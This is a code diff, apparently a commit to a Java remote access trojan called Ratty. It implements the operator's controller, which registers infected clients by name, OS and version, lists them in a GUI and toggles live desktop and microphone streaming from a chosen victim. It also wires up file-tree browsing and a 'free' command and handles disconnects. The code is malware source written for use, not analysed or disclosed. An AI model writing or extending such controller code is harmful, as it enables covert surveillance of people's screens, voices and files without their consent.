@@ -4,6 +4,7 @@ import java.util.ArrayList;
 
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.IConnectionObserver;
+import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
 import de.sogomn.rat.server.ActiveServer;
@@ -24,11 +25,22 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 	}
 	
 	private void logIn(final ServerClient client, final InformationPacket packet) {
+		final String name = packet.getName();
+		final String os = packet.getOs();
+		final String version = packet.getVersion();
 		
+		client.logIn(name, os, version);
+		gui.addRow(client);
+		gui.addListener(client.displayController);
+		gui.addListener(client.fileTreeController);
 	}
 	
 	private IPacket getPacket(final String command, final ServerClient client) {
 		IPacket packet = null;
+		
+		if (command == RattyGui.FREE) {
+			packet = new FreePacket();
+		}
 		
 		return packet;
 	}
@@ -49,39 +61,60 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 	}
 	
 	@Override
+	public void connected(final ActiveServer server, final ActiveConnection connection) {
+		final ServerClient client = new ServerClient(connection);
+		final InformationPacket packet = new InformationPacket();
+		
+		connection.setObserver(this);
+		connection.start();
+		connection.addPacket(packet);
+		clients.add(client);
+	}
+	
+	@Override
 	public void disconnected(final ActiveConnection connection) {
 		final ServerClient client = getClient(connection);
+		
+		gui.removeListener(client.displayController);
+		gui.removeListener(client.fileTreeController);
+		gui.removeRow(client);
+		clients.remove(client);
 		
 		client.setStreamingDesktop(false);
 		client.setStreamingVoice(false);
 		
 		connection.setObserver(null);
 		connection.close();
-		
-		clients.remove(client);
-		gui.removeRow(client);
-	}
-	
-	@Override
-	public synchronized void connected(final ActiveServer server, final ActiveConnection connection) {
-		final ServerClient client = new ServerClient(connection);
-		final InformationPacket packet = new InformationPacket();
-		
-		connection.setObserver(this);
-		clients.add(client);
-		connection.start();
-		connection.addPacket(packet);
 	}
 	
 	@Override
 	public void closed(final ActiveServer server) {
-		//...
+		gui.removeAllListeners();
+		
+		clients.stream().forEach(client -> {
+			client.connection.setObserver(null);
+			client.connection.close();
+		});
+		
+		clients.clear();
 	}
 	
 	@Override
 	public void userInput(final String command) {
 		final ServerClient client = gui.getLastServerClientClicked();
 		final IPacket packet = getPacket(command, client);
+		
+		if (command == RattyGui.DESKTOP) {
+			final boolean streamingDesktop = client.isStreamingDesktop();
+			
+			client.setStreamingDesktop(!streamingDesktop);
+			gui.update();
+		} else if (command == RattyGui.VOICE) {
+			final boolean streamingVoice = client.isStreamingVoice();
+			
+			client.setStreamingVoice(!streamingVoice);
+			gui.update();
+		}
 		
 		if (packet != null) {
 			client.connection.addPacket(packet);
